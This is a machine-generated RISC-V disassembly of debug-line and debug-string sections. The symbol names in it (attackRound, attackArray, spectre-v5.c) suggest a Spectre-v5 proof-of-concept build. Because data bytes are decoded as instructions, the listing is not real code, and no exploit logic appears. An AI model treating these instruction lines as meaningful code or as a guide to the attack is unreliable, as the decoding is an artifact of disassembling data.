    147c:	0c05                	addi	s8,s8,1
    147e:	02090403          	lb	s0,32(s2)
    1482:	0100                	addi	s0,sp,128
    1484:	0705                	addi	a4,a4,1
    1486:	06090103          	lb	sp,96(s2)
    148a:	0100                	addi	s0,sp,128
    148c:	0c05                	addi	s8,s8,1
    148e:	02090503          	lb	a0,32(s2)
    1492:	0100                	addi	s0,sp,128
    1494:	0705                	addi	a4,a4,1
    1496:	06090103          	lb	sp,96(s2)
    149a:	0100                	addi	s0,sp,128
    149c:	0d05                	addi	s10,s10,1
    149e:	02090503          	lb	a0,32(s2)
    14a2:	0100                	addi	s0,sp,128
    14a4:	0705                	addi	a4,a4,1
    14a6:	06090103          	lb	sp,96(s2)
    14aa:	0100                	addi	s0,sp,128
    14ac:	0e090103          	lb	sp,224(s2)
    14b0:	0100                	addi	s0,sp,128
    14b2:	0c05                	addi	s8,s8,1
    14b4:	0e090503          	lb	a0,224(s2)
    14b8:	0100                	addi	s0,sp,128
    14ba:	0d05                	addi	s10,s10,1
    14bc:	06090203          	lb	tp,96(s2)
    14c0:	0100                	addi	s0,sp,128
    14c2:	0705                	addi	a4,a4,1
    14c4:	14090203          	lb	tp,320(s2)
    14c8:	0100                	addi	s0,sp,128
    14ca:	1e090103          	lb	sp,480(s2)
    14ce:	0100                	addi	s0,sp,128
    14d0:	02090403          	lb	s0,32(s2)
    14d4:	0100                	addi	s0,sp,128
    14d6:	0c090103          	lb	sp,192(s2)
    14da:	0100                	addi	s0,sp,128
    14dc:	02090403          	lb	s0,32(s2)
    14e0:	0100                	addi	s0,sp,128
    14e2:	0b05                	addi	s6,s6,1
    14e4:	0e090103          	lb	sp,224(s2)
    14e8:	0100                	addi	s0,sp,128
    14ea:	0705                	addi	a4,a4,1
    14ec:	08090103          	lb	sp,128(s2)
    14f0:	0100                	addi	s0,sp,128
    14f2:	0b05                	addi	s6,s6,1
    14f4:	097ef803          	0x97ef803
    14f8:	0002                	c.slli	zero,0x0
    14fa:	0501                	addi	a0,a0,0
    14fc:	0309                	addi	t1,t1,2
    14fe:	0902                	slli	s2,s2,0x0
    1500:	0002                	c.slli	zero,0x0
    1502:	0501                	addi	a0,a0,0
    1504:	0301                	addi	t1,t1,0
    1506:	0189                	addi	gp,gp,2
    1508:	0209                	addi	tp,tp,2
    150a:	0100                	addi	s0,sp,128
    150c:	0c090303          	lb	t1,192(s2)
    1510:	0100                	addi	s0,sp,128
    1512:	0305                	addi	t1,t1,1
    1514:	1e090203          	lb	tp,480(s2)
    1518:	0100                	addi	s0,sp,128
    151a:	14090203          	lb	tp,320(s2)
    151e:	0100                	addi	s0,sp,128
    1520:	0a05                	addi	s4,s4,1
    1522:	18090303          	lb	t1,384(s2)
    1526:	0100                	addi	s0,sp,128
    1528:	0105                	addi	sp,sp,1
    152a:	02090103          	lb	sp,32(s2)
    152e:	0100                	addi	s0,sp,128
    1530:	0305                	addi	t1,t1,1
    1532:	0a090903          	lb	s2,160(s2)
    1536:	0100                	addi	s0,sp,128
    1538:	0c05                	addi	s8,s8,1
    153a:	14090103          	lb	sp,320(s2)
    153e:	0100                	addi	s0,sp,128
    1540:	0605                	addi	a2,a2,1
    1542:	08090103          	lb	sp,128(s2)
    1546:	0100                	addi	s0,sp,128
    1548:	0c05                	addi	s8,s8,1
    154a:	06090003          	lb	zero,96(s2)
    154e:	0100                	addi	s0,sp,128
    1550:	0605                	addi	a2,a2,1
    1552:	0c090103          	lb	sp,192(s2)
    1556:	0100                	addi	s0,sp,128
    1558:	0c05                	addi	s8,s8,1
    155a:	06090003          	lb	zero,96(s2)
    155e:	0100                	addi	s0,sp,128
    1560:	0305                	addi	t1,t1,1
    1562:	0a090103          	lb	sp,160(s2)
    1566:	0100                	addi	s0,sp,128
    1568:	0105                	addi	sp,sp,1
    156a:	08097603          	0x8097603
    156e:	0100                	addi	s0,sp,128
    1570:	0304                	addi	s1,sp,384
    1572:	0505                	addi	a0,a0,1
    1574:	097f8b03          	lb	s6,151(t6) # fffffffffffe7097 <_end+0xffffffff7ffcbe17>
    1578:	0020                	addi	s0,sp,8
    157a:	0401                	addi	s0,s0,0
    157c:	0502                	slli	a0,a0,0x0
    157e:	0309                	addi	t1,t1,2
    1580:	4c0900f7          	0x4c0900f7
    1584:	0100                	addi	s0,sp,128
    1586:	0305                	addi	t1,t1,1
    1588:	08090103          	lb	sp,128(s2)
    158c:	0100                	addi	s0,sp,128
    158e:	14090903          	lb	s2,320(s2)
    1592:	0100                	addi	s0,sp,128
    1594:	1a090103          	lb	sp,416(s2)
    1598:	0100                	addi	s0,sp,128
    159a:	0805                	addi	a6,a6,1
    159c:	04090003          	lb	zero,64(s2)
    15a0:	0100                	addi	s0,sp,128
    15a2:	0e05                	addi	t3,t3,1
    15a4:	04090303          	lb	t1,64(s2)
    15a8:	0100                	addi	s0,sp,128
    15aa:	0105                	addi	sp,sp,1
    15ac:	0e090103          	lb	sp,224(s2)
    15b0:	0100                	addi	s0,sp,128
    15b2:	0a090303          	lb	t1,160(s2)
    15b6:	0100                	addi	s0,sp,128
    15b8:	0905                	addi	s2,s2,1
    15ba:	12090103          	lb	sp,288(s2)
    15be:	0100                	addi	s0,sp,128
    15c0:	1b05                	addi	s6,s6,-31
    15c2:	04090003          	lb	zero,64(s2)
    15c6:	0100                	addi	s0,sp,128
    15c8:	1905                	addi	s2,s2,-31
    15ca:	04090003          	lb	zero,64(s2)
    15ce:	0100                	addi	s0,sp,128
    15d0:	2a05                	addiw	s4,s4,1
    15d2:	02090003          	lb	zero,32(s2)
    15d6:	0100                	addi	s0,sp,128
    15d8:	3105                	addiw	sp,sp,-31
    15da:	06090003          	lb	zero,96(s2)
    15de:	0100                	addi	s0,sp,128
    15e0:	0605                	addi	a2,a2,1
    15e2:	02090003          	lb	zero,32(s2)
    15e6:	0100                	addi	s0,sp,128
    15e8:	1605                	addi	a2,a2,-31
    15ea:	02090103          	lb	sp,32(s2)
    15ee:	0100                	addi	s0,sp,128
    15f0:	1005                	c.nop	-31
    15f2:	08090103          	lb	sp,128(s2)
    15f6:	0100                	addi	s0,sp,128
    15f8:	0b05                	addi	s6,s6,1
    15fa:	08090103          	lb	sp,128(s2)
    15fe:	0100                	addi	s0,sp,128
    1600:	1005                	c.nop	-31
    1602:	02090103          	lb	sp,32(s2)
    1606:	0100                	addi	s0,sp,128
    1608:	0905                	addi	s2,s2,1
    160a:	0c090003          	lb	zero,192(s2)
    160e:	0100                	addi	s0,sp,128
    1610:	0e05                	addi	t3,t3,1
    1612:	0c090003          	lb	zero,192(s2)
    1616:	0100                	addi	s0,sp,128
    1618:	0c05                	addi	s8,s8,1
    161a:	02090003          	lb	zero,32(s2)
    161e:	0100                	addi	s0,sp,128
    1620:	2205                	addiw	tp,tp,1
    1622:	02097f03          	0x2097f03
    1626:	0100                	addi	s0,sp,128
    1628:	0b05                	addi	s6,s6,1
    162a:	0a090003          	lb	zero,160(s2)
    162e:	0100                	addi	s0,sp,128
    1630:	1105                	addi	sp,sp,-31
    1632:	0a090303          	lb	t1,160(s2)
    1636:	0100                	addi	s0,sp,128
    1638:	0b05                	addi	s6,s6,1
    163a:	08090103          	lb	sp,128(s2)
    163e:	0100                	addi	s0,sp,128
    1640:	08090103          	lb	sp,128(s2)
    1644:	0100                	addi	s0,sp,128
    1646:	1005                	c.nop	-31
    1648:	02090103          	lb	sp,32(s2)
    164c:	0100                	addi	s0,sp,128
    164e:	0905                	addi	s2,s2,1
    1650:	0c090003          	lb	zero,192(s2)
    1654:	0100                	addi	s0,sp,128
    1656:	0e05                	addi	t3,t3,1
    1658:	0c090003          	lb	zero,192(s2)
    165c:	0100                	addi	s0,sp,128
    165e:	0c05                	addi	s8,s8,1
    1660:	04090003          	lb	zero,64(s2)
    1664:	0100                	addi	s0,sp,128
    1666:	1d05                	addi	s10,s10,-31
    1668:	04097f03          	0x4097f03
    166c:	0100                	addi	s0,sp,128
    166e:	0b05                	addi	s6,s6,1
    1670:	0a090003          	lb	zero,160(s2)
    1674:	0100                	addi	s0,sp,128
    1676:	0a05                	addi	s4,s4,1
    1678:	08090303          	lb	t1,128(s2)
    167c:	0100                	addi	s0,sp,128
    167e:	0105                	addi	sp,sp,1
    1680:	04090103          	lb	sp,64(s2)
    1684:	0100                	addi	s0,sp,128
    1686:	08090303          	lb	t1,128(s2)
    168a:	0100                	addi	s0,sp,128
    168c:	0905                	addi	s2,s2,1
    168e:	14090103          	lb	sp,320(s2)
    1692:	0100                	addi	s0,sp,128
    1694:	1905                	addi	s2,s2,-31
    1696:	04090003          	lb	zero,64(s2)
    169a:	0100                	addi	s0,sp,128
    169c:	2005                	0x2005
    169e:	06090003          	lb	zero,96(s2)
    16a2:	0100                	addi	s0,sp,128
    16a4:	0605                	addi	a2,a2,1
    16a6:	02090003          	lb	zero,32(s2)
    16aa:	0100                	addi	s0,sp,128
    16ac:	1b05                	addi	s6,s6,-31
    16ae:	02090103          	lb	sp,32(s2)
    16b2:	0100                	addi	s0,sp,128
    16b4:	0f05                	addi	t5,t5,1
    16b6:	04090003          	lb	zero,64(s2)
    16ba:	0100                	addi	s0,sp,128
    16bc:	1205                	addi	tp,tp,-31
    16be:	08090103          	lb	sp,128(s2)
    16c2:	0100                	addi	s0,sp,128
    16c4:	0a05                	addi	s4,s4,1
    16c6:	06090003          	lb	zero,96(s2)
    16ca:	0100                	addi	s0,sp,128
    16cc:	1205                	addi	tp,tp,-31
    16ce:	0a090103          	lb	sp,160(s2)
    16d2:	0100                	addi	s0,sp,128
    16d4:	0a05                	addi	s4,s4,1
    16d6:	06090003          	lb	zero,96(s2)
    16da:	0100                	addi	s0,sp,128
    16dc:	1805                	addi	a6,a6,-31
    16de:	0a090103          	lb	sp,160(s2)
    16e2:	0100                	addi	s0,sp,128
    16e4:	0a05                	addi	s4,s4,1
    16e6:	06090003          	lb	zero,96(s2)
    16ea:	0100                	addi	s0,sp,128
    16ec:	1005                	c.nop	-31
    16ee:	0a090203          	lb	tp,160(s2)
    16f2:	0100                	addi	s0,sp,128
    16f4:	0b05                	addi	s6,s6,1
    16f6:	08090103          	lb	sp,128(s2)
    16fa:	0100                	addi	s0,sp,128
    16fc:	0905                	addi	s2,s2,1
    16fe:	02090103          	lb	sp,32(s2)
    1702:	0100                	addi	s0,sp,128
    1704:	0c05                	addi	s8,s8,1
    1706:	0c090003          	lb	zero,192(s2)
    170a:	0100                	addi	s0,sp,128
    170c:	2205                	addiw	tp,tp,1
    170e:	06097f03          	0x6097f03
    1712:	0100                	addi	s0,sp,128
    1714:	0b05                	addi	s6,s6,1
    1716:	0a090003          	lb	zero,160(s2)
    171a:	0100                	addi	s0,sp,128
    171c:	0a090303          	lb	t1,160(s2)
    1720:	0100                	addi	s0,sp,128
    1722:	08090103          	lb	sp,128(s2)
    1726:	0100                	addi	s0,sp,128
    1728:	0905                	addi	s2,s2,1
    172a:	02090103          	lb	sp,32(s2)
    172e:	0100                	addi	s0,sp,128
    1730:	0c05                	addi	s8,s8,1
    1732:	0c090003          	lb	zero,192(s2)
    1736:	0100                	addi	s0,sp,128
    1738:	1d05                	addi	s10,s10,-31
    173a:	0c097f03          	0xc097f03
    173e:	0100                	addi	s0,sp,128
    1740:	0b05                	addi	s6,s6,1
    1742:	0a090003          	lb	zero,160(s2)
    1746:	0100                	addi	s0,sp,128
    1748:	0a05                	addi	s4,s4,1
    174a:	08090303          	lb	t1,128(s2)
    174e:	0100                	addi	s0,sp,128
    1750:	0105                	addi	sp,sp,1
    1752:	04090103          	lb	sp,64(s2)
    1756:	0100                	addi	s0,sp,128
    1758:	08090303          	lb	t1,128(s2)
    175c:	0100                	addi	s0,sp,128
    175e:	0f05                	addi	t5,t5,1
    1760:	0a090103          	lb	sp,160(s2)
    1764:	0100                	addi	s0,sp,128
    1766:	0905                	addi	s2,s2,1
    1768:	08090103          	lb	sp,128(s2)
    176c:	0100                	addi	s0,sp,128
    176e:	0605                	addi	a2,a2,1
    1770:	02090103          	lb	sp,32(s2)
    1774:	0100                	addi	s0,sp,128
    1776:	0a05                	addi	s4,s4,1
    1778:	0a097f03          	0xa097f03
    177c:	0100                	addi	s0,sp,128
    177e:	0905                	addi	s2,s2,1
    1780:	08090003          	lb	zero,128(s2)
    1784:	0100                	addi	s0,sp,128
    1786:	0c05                	addi	s8,s8,1
    1788:	02090203          	lb	tp,32(s2)
    178c:	0100                	addi	s0,sp,128
    178e:	0105                	addi	sp,sp,1
    1790:	0c090103          	lb	sp,192(s2)
    1794:	0100                	addi	s0,sp,128
    1796:	08090303          	lb	t1,128(s2)
    179a:	0100                	addi	s0,sp,128
    179c:	0f05                	addi	t5,t5,1
    179e:	0e090103          	lb	sp,224(s2)
    17a2:	0100                	addi	s0,sp,128
    17a4:	0905                	addi	s2,s2,1
    17a6:	08090103          	lb	sp,128(s2)
    17aa:	0100                	addi	s0,sp,128
    17ac:	0605                	addi	a2,a2,1
    17ae:	02090103          	lb	sp,32(s2)
    17b2:	0100                	addi	s0,sp,128
    17b4:	0b05                	addi	s6,s6,1
    17b6:	0a097f03          	0xa097f03
    17ba:	0100                	addi	s0,sp,128
    17bc:	0905                	addi	s2,s2,1
    17be:	0c090003          	lb	zero,192(s2)
    17c2:	0100                	addi	s0,sp,128
    17c4:	1105                	addi	sp,sp,-31
    17c6:	0200                	addi	s0,sp,256
    17c8:	0104                	addi	s1,sp,128
    17ca:	02090003          	lb	zero,32(s2)
    17ce:	0100                	addi	s0,sp,128
    17d0:	0e05                	addi	t3,t3,1
    17d2:	0200                	addi	s0,sp,256
    17d4:	0104                	addi	s1,sp,128
    17d6:	08090003          	lb	zero,128(s2)
    17da:	0100                	addi	s0,sp,128
    17dc:	0c05                	addi	s8,s8,1
    17de:	02090203          	lb	tp,32(s2)
    17e2:	0100                	addi	s0,sp,128
    17e4:	0105                	addi	sp,sp,1
    17e6:	0c090103          	lb	sp,192(s2)
    17ea:	0100                	addi	s0,sp,128
    17ec:	08090303          	lb	t1,128(s2)
    17f0:	0100                	addi	s0,sp,128
    17f2:	0d05                	addi	s10,s10,1
    17f4:	0200                	addi	s0,sp,256
    17f6:	0204                	addi	s1,sp,256
    17f8:	0e090403          	lb	s0,224(s2)
    17fc:	0100                	addi	s0,sp,128
    17fe:	0805                	addi	a6,a6,1
    1800:	0200                	addi	s0,sp,256
    1802:	0204                	addi	s1,sp,256
    1804:	0c090003          	lb	zero,192(s2)
    1808:	0100                	addi	s0,sp,128
    180a:	0d05                	addi	s10,s10,1
    180c:	0200                	addi	s0,sp,256
    180e:	0204                	addi	s1,sp,256
    1810:	08090103          	lb	sp,128(s2)
    1814:	0100                	addi	s0,sp,128
    1816:	0805                	addi	a6,a6,1
    1818:	0200                	addi	s0,sp,256
    181a:	0204                	addi	s1,sp,256
    181c:	0c090003          	lb	zero,192(s2)
    1820:	0100                	addi	s0,sp,128
    1822:	0305                	addi	t1,t1,1
    1824:	0200                	addi	s0,sp,256
    1826:	0204                	addi	s1,sp,256
    1828:	08090103          	lb	sp,128(s2)
    182c:	0100                	addi	s0,sp,128
    182e:	1405                	addi	s0,s0,-31
    1830:	0200                	addi	s0,sp,256
    1832:	0104                	addi	s1,sp,128
    1834:	0a090003          	lb	zero,160(s2)
    1838:	0100                	addi	s0,sp,128
    183a:	0d05                	addi	s10,s10,1
    183c:	14090203          	lb	tp,320(s2)
    1840:	0100                	addi	s0,sp,128
    1842:	0105                	addi	sp,sp,1
    1844:	14090103          	lb	sp,320(s2)
    1848:	0100                	addi	s0,sp,128
    184a:	08090303          	lb	t1,128(s2)
    184e:	0100                	addi	s0,sp,128
    1850:	0905                	addi	s2,s2,1
    1852:	0e090103          	lb	sp,224(s2)
    1856:	0100                	addi	s0,sp,128
    1858:	08090103          	lb	sp,128(s2)
    185c:	0100                	addi	s0,sp,128
    185e:	1605                	addi	a2,a2,-31
    1860:	0200                	addi	s0,sp,256
    1862:	0104                	addi	s1,sp,128
    1864:	02090003          	lb	zero,32(s2)
    1868:	0100                	addi	s0,sp,128
    186a:	0d05                	addi	s10,s10,1
    186c:	0200                	addi	s0,sp,256
    186e:	0104                	addi	s1,sp,128
    1870:	0c090003          	lb	zero,192(s2)
    1874:	0100                	addi	s0,sp,128
    1876:	1205                	addi	tp,tp,-31
    1878:	0200                	addi	s0,sp,256
    187a:	0104                	addi	s1,sp,128
    187c:	0c090003          	lb	zero,192(s2)
    1880:	0100                	addi	s0,sp,128
    1882:	1005                	c.nop	-31
    1884:	0200                	addi	s0,sp,256
    1886:	0104                	addi	s1,sp,128
    1888:	04090003          	lb	zero,64(s2)
    188c:	0100                	addi	s0,sp,128
    188e:	0b05                	addi	s6,s6,1
    1890:	0200                	addi	s0,sp,256
    1892:	0104                	addi	s1,sp,128
    1894:	04090003          	lb	zero,64(s2)
    1898:	0100                	addi	s0,sp,128
    189a:	0905                	addi	s2,s2,1
    189c:	0200                	addi	s0,sp,256
    189e:	0104                	addi	s1,sp,128
    18a0:	04090003          	lb	zero,64(s2)
    18a4:	0100                	addi	s0,sp,128
    18a6:	0a05                	addi	s4,s4,1
    18a8:	02090203          	lb	tp,32(s2)
    18ac:	0100                	addi	s0,sp,128
    18ae:	0105                	addi	sp,sp,1
    18b0:	04090103          	lb	sp,64(s2)
    18b4:	0100                	addi	s0,sp,128
    18b6:	08090303          	lb	t1,128(s2)
    18ba:	0100                	addi	s0,sp,128
    18bc:	0805                	addi	a6,a6,1
    18be:	0a090103          	lb	sp,160(s2)
    18c2:	0100                	addi	s0,sp,128
    18c4:	0705                	addi	a4,a4,1
    18c6:	04090103          	lb	sp,64(s2)
    18ca:	0100                	addi	s0,sp,128
    18cc:	0905                	addi	s2,s2,1
    18ce:	04090203          	lb	tp,64(s2)
    18d2:	0100                	addi	s0,sp,128
    18d4:	0805                	addi	a6,a6,1
    18d6:	02090103          	lb	sp,32(s2)
    18da:	0100                	addi	s0,sp,128
    18dc:	0a05                	addi	s4,s4,1
    18de:	0a097f03          	0xa097f03
    18e2:	0100                	addi	s0,sp,128
    18e4:	0905                	addi	s2,s2,1
    18e6:	08090003          	lb	zero,128(s2)
    18ea:	0100                	addi	s0,sp,128
    18ec:	0705                	addi	a4,a4,1
    18ee:	0a090303          	lb	t1,160(s2)
    18f2:	0100                	addi	s0,sp,128
    18f4:	0605                	addi	a2,a2,1
    18f6:	08090003          	lb	zero,128(s2)
    18fa:	0100                	addi	s0,sp,128
    18fc:	1605                	addi	a2,a2,-31
    18fe:	0200                	addi	s0,sp,256
    1900:	0104                	addi	s1,sp,128
    1902:	0a090003          	lb	zero,160(s2)
    1906:	0100                	addi	s0,sp,128
    1908:	1305                	addi	t1,t1,-31
    190a:	0200                	addi	s0,sp,256
    190c:	0104                	addi	s1,sp,128
    190e:	08090003          	lb	zero,128(s2)
    1912:	0100                	addi	s0,sp,128
    1914:	0c05                	addi	s8,s8,1
    1916:	0a090103          	lb	sp,160(s2)
    191a:	0100                	addi	s0,sp,128
    191c:	1105                	addi	sp,sp,-31
    191e:	08090003          	lb	zero,128(s2)
    1922:	0100                	addi	s0,sp,128
    1924:	0a05                	addi	s4,s4,1
    1926:	14090003          	lb	zero,320(s2)
    192a:	0100                	addi	s0,sp,128
    192c:	0805                	addi	a6,a6,1
    192e:	04090103          	lb	sp,64(s2)
    1932:	0100                	addi	s0,sp,128
    1934:	0905                	addi	s2,s2,1
    1936:	0a090303          	lb	t1,160(s2)
    193a:	0100                	addi	s0,sp,128
    193c:	02090103          	lb	sp,32(s2)
    1940:	0100                	addi	s0,sp,128
    1942:	1005                	c.nop	-31
    1944:	10090103          	lb	sp,256(s2)
    1948:	0100                	addi	s0,sp,128
    194a:	0c05                	addi	s8,s8,1
    194c:	0c090003          	lb	zero,192(s2)
    1950:	0100                	addi	s0,sp,128
    1952:	1305                	addi	t1,t1,-31
    1954:	06090003          	lb	zero,96(s2)
    1958:	0100                	addi	s0,sp,128
    195a:	0905                	addi	s2,s2,1
    195c:	08090003          	lb	zero,128(s2)
    1960:	0100                	addi	s0,sp,128
    1962:	0a05                	addi	s4,s4,1
    1964:	0a097e03          	0xa097e03
    1968:	0100                	addi	s0,sp,128
    196a:	0905                	addi	s2,s2,1
    196c:	08090003          	lb	zero,128(s2)
    1970:	0100                	addi	s0,sp,128
    1972:	1605                	addi	a2,a2,-31
    1974:	02090503          	lb	a0,32(s2)
    1978:	0100                	addi	s0,sp,128
    197a:	0200                	addi	s0,sp,256
    197c:	0104                	addi	s1,sp,128
    197e:	0306                	slli	t1,t1,0x1
    1980:	0900                	addi	s0,sp,144
    1982:	0008                	0x8
    1984:	0001                	nop
    1986:	0402                	slli	s0,s0,0x0
    1988:	0302                	slli	t1,t1,0x0
    198a:	0900                	addi	s0,sp,144
    198c:	000a                	c.slli	zero,0x2
    198e:	0501                	addi	a0,a0,0
    1990:	0001                	nop
    1992:	0402                	slli	s0,s0,0x0
    1994:	0605                	addi	a2,a2,1
    1996:	04090103          	lb	sp,64(s2)
    199a:	0100                	addi	s0,sp,128
    199c:	0809                	addi	a6,a6,2
    199e:	0000                	unimp
    19a0:	0101                	addi	sp,sp,0

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	645f 6f73 685f      	0x685f6f73645f
   6:	6e61                	lui	t3,0x18
   8:	6c64                	ld	s1,216(s0)
   a:	0065                	c.nop	25
   c:	7461                	lui	s0,0xffff8
   e:	756f526b          	0x756f526b
  12:	646e                	ld	s0,216(sp)
  14:	5f00                	lw	s0,56(a4)
  16:	6172                	ld	sp,280(sp)
  18:	646e                	ld	s0,216(sp)
  1a:	3834                	fld	fa3,112(s0)
  1c:	5f00                	lw	s0,56(a4)
  1e:	6d65                	lui	s10,0x19
  20:	7265                	lui	tp,0xffff9
  22:	636e6567          	0x636e6567
  26:	0079                	c.nop	30
  28:	5f5f 6975 746e      	0x746e69755f5f
  2e:	5f38                	lw	a4,120(a4)
  30:	0074                	addi	a3,sp,12
  32:	4f746573          	csrrsi	a0,0x4f7,8
  36:	6666                	ld	a2,88(sp)
  38:	00746573          	csrrsi	a0,0x7,8
  3c:	775f 7263 6f74      	0x6f747263775f
  42:	626d                	lui	tp,0x1b
  44:	735f 6174 6574      	0x65746174735f
  4a:	5f00                	lw	s0,56(a4)
  4c:	72736377          	0x72736377
  50:	6f74                	ld	a3,216(a4)
  52:	626d                	lui	tp,0x1b
  54:	74735f73          	csrrwi	t5,0x747,6
  58:	7461                	lui	s0,0xffff8
  5a:	0065                	c.nop	25
  5c:	6f6c                	ld	a1,216(a4)
  5e:	676e                	ld	a4,216(sp)
  60:	6c20                	ld	s0,88(s0)
  62:	20676e6f          	jal	t3,76268 <_tbss_end+0x761e4>
  66:	6e75                	lui	t3,0x1d
  68:	6e676973          	csrrsi	s2,0x6e6,14
  6c:	6465                	lui	s0,0x19
  6e:	6920                	ld	s0,80(a0)
  70:	746e                	ld	s0,248(sp)
  72:	6100                	ld	s0,0(a0)
  74:	7474                	ld	a3,232(s0)
  76:	6361                	lui	t1,0x18
  78:	7272416b          	0x7272416b
  7c:	7961                	lui	s2,0xffff8
  7e:	5f00                	lw	s0,56(a4)
  80:	626c                	ld	a1,192(a2)
  82:	7366                	ld	t1,120(sp)
  84:	7a69                	lui	s4,0xffffa
  86:	0065                	c.nop	25
  88:	6461                	lui	s0,0x18
  8a:	7264                	ld	s1,224(a2)
  8c:	6400                	ld	s0,8(s0)
  8e:	6669                	lui	a2,0x1a
  90:	0066                	c.slli	zero,0x19
  92:	5f5f 6f6c 6163      	0x61636f6c5f5f
  98:	656c                	ld	a1,200(a0)
  9a:	745f 6800 7469      	0x74696800745f
  a0:	7241                	lui	tp,0xffff0
  a2:	6172                	ld	sp,280(sp)
  a4:	0079                	c.nop	30
  a6:	6d5f 7262 6f74      	0x6f7472626d5f
  ac:	735f6377          	0x735f6377
  b0:	6174                	ld	a3,192(a0)
  b2:	6574                	ld	a3,200(a0)
  b4:	5f00                	lw	s0,56(a4)
  b6:	6f746377          	0x6f746377
  ba:	626d                	lui	tp,0x1b
  bc:	735f 6174 6574      	0x65746174735f
  c2:	5f00                	lw	s0,56(a4)
  c4:	745f 5f6d 6573      	0x65735f6d745f
  ca:	61770063          	beq	a4,s7,6ca <_tbss_end+0x646>
  ce:	4f79                	li	t5,30
  d0:	6666                	ld	a2,88(sp)
  d2:	00746573          	csrrsi	a0,0x7,8
  d6:	6f6c                	ld	a1,216(a4)
  d8:	676e                	ld	a4,216(sp)
  da:	6c20                	ld	s0,88(s0)
  dc:	20676e6f          	jal	t3,762e2 <_tbss_end+0x7625e>
  e0:	6e69                	lui	t3,0x1a
  e2:	0074                	addi	a3,sp,12
  e4:	755f 7562 0066      	0x667562755f
  ea:	625f 7361 0065      	0x657361625f
  f0:	7564                	ld	s1,232(a0)
  f2:	6d6d                	lui	s10,0x1b
  f4:	0079                	c.nop	30
  f6:	5f5f 6d74 685f      	0x685f6d745f5f
  fc:	0072756f          	jal	a0,27902 <_tbss_end+0x2787e>
 100:	5f5f 6673 5f00      	0x5f0066735f5f
 106:	655f6e6f          	jal	t3,f6f5a <_tbss_end+0xf6ed6>
 10a:	6978                	ld	a4,208(a0)
 10c:	5f74                	lw	a3,124(a4)
 10e:	7261                	lui	tp,0xffff8
 110:	5f007367          	0x5f007367
 114:	6b6f6f63          	bltu	t5,s6,7d2 <_tbss_end+0x74e>
 118:	6569                	lui	a0,0x1a
 11a:	5f00                	lw	s0,56(a4)
 11c:	735f 6c67 6575      	0x65756c67735f
 122:	5f00                	lw	s0,56(a4)
 124:	6c66                	ld	s8,88(sp)
 126:	6761                	lui	a4,0x18
 128:	695f0073          	0x695f0073
 12c:	78635f73          	csrrwi	t5,0x786,6
 130:	0061                	c.nop	24
 132:	735f 6474 6e69      	0x6e696474735f
 138:	6f00                	ld	s0,24(a4)
 13a:	7475                	lui	s0,0xffffd
 13c:	6156                	ld	sp,336(sp)
 13e:	416c                	lw	a1,68(a0)
 140:	7272                	ld	tp,312(sp)
 142:	7961                	lui	s2,0xffff8
 144:	5f00                	lw	s0,56(a4)
 146:	6c62                	ld	s8,24(sp)
 148:	7a69736b          	0x7a69736b
 14c:	0065                	c.nop	25
 14e:	635f 7476 7562      	0x75627476635f
 154:	0066                	c.slli	zero,0x19
 156:	6f5f 6666 6573      	0x657366666f5f
 15c:	0074                	addi	a3,sp,12
 15e:	6d5f 7362 7472      	0x747273626d5f
 164:	7363776f          	jal	a4,3789a <_tbss_end+0x37816>
 168:	735f 6174 6574      	0x65746174735f
 16e:	5f00                	lw	s0,56(a4)
 170:	626d                	lui	tp,0x1b
 172:	6c72                	ld	s8,280(sp)
 174:	6e65                	lui	t3,0x19
 176:	735f 6174 6574      	0x65746174735f
 17c:	5f00                	lw	s0,56(a4)
 17e:	6e66                	ld	t3,88(sp)
 180:	7261                	lui	tp,0xffff8
 182:	5f007367          	0x5f007367
 186:	6e66                	ld	t3,88(sp)
 188:	72730073          	0x72730073
 18c:	70732f63          	0x70732f63
 190:	6365                	lui	t1,0x19
 192:	7274                	ld	a3,224(a2)
 194:	2d65                	addiw	s10,s10,25
 196:	3576                	fld	fa0,376(sp)
 198:	632e                	ld	t1,200(sp)
 19a:	5f00                	lw	s0,56(a4)
 19c:	6e676973          	csrrsi	s2,0x6e6,14
 1a0:	5f00                	lw	s0,56(a4)
 1a2:	745f 706d 5f00      	0x5f00706d745f
 1a8:	6c66                	ld	s8,88(sp)
 1aa:	5f6b636f          	jal	t1,b67a0 <_tbss_end+0xb671c>
 1ae:	0074                	addi	a3,sp,12
 1b0:	735f 6474 7265      	0x72656474735f
 1b6:	0072                	c.slli	zero,0x1c
 1b8:	425f 6769 6e69      	0x6e696769425f
 1be:	0074                	addi	a3,sp,12
 1c0:	675f 6d61 616d      	0x616d6d61675f
 1c6:	735f 6769 676e      	0x676e6769735f
 1cc:	6d61                	lui	s10,0x18
 1ce:	5f00                	lw	s0,56(a4)
 1d0:	6572                	ld	a0,280(sp)
 1d2:	6461                	lui	s0,0x18
 1d4:	5f00                	lw	s0,56(a4)
 1d6:	6572                	ld	a0,280(sp)
 1d8:	746c7573          	csrrci	a0,0x746,24
 1dc:	6b5f 5f00 745f      	0x745f5f006b5f
 1e2:	006d                	c.nop	27
 1e4:	6e69                	lui	t3,0x1a
 1e6:	7241                	lui	tp,0xffff0
 1e8:	6172                	ld	sp,280(sp)
 1ea:	5379                	li	t1,-2
 1ec:	7a69                	lui	s4,0xffffa
 1ee:	0065                	c.nop	25
 1f0:	5f5f 6377 6268      	0x626863775f5f
 1f6:	5f00                	lw	s0,56(a4)
 1f8:	6f647473          	csrrci	s0,0x6f6,8
 1fc:	7475                	lui	s0,0xffffd
 1fe:	5f00                	lw	s0,56(a4)
 200:	6c747663          	bleu	t2,s0,8cc <_tbss_end+0x848>
 204:	6e65                	lui	t3,0x19
 206:	6900                	ld	s0,16(a0)
 208:	416e                	lw	sp,216(sp)
 20a:	7272                	ld	tp,312(sp)
 20c:	7961                	lui	s2,0xffff8
 20e:	5f00                	lw	s0,56(a4)
 210:	6966                	ld	s2,88(sp)
 212:	656c                	ld	a1,200(a0)
 214:	5f00                	lw	s0,56(a4)
 216:	696e                	ld	s2,216(sp)
 218:	0073626f          	jal	tp,36a1e <_tbss_end+0x3699a>
 21c:	726f6873          	csrrsi	a6,0x726,30
 220:	2074                	fld	fa3,192(s0)
 222:	6e75                	lui	t3,0x1d
 224:	6e676973          	csrrsi	s2,0x6e6,14
 228:	6465                	lui	s0,0x19
 22a:	6920                	ld	s0,80(a0)
 22c:	746e                	ld	s0,248(sp)
 22e:	5f00                	lw	s0,56(a4)
 230:	7461                	lui	s0,0xffff8
 232:	7865                	lui	a6,0xffff9
 234:	7469                	lui	s0,0xffffa
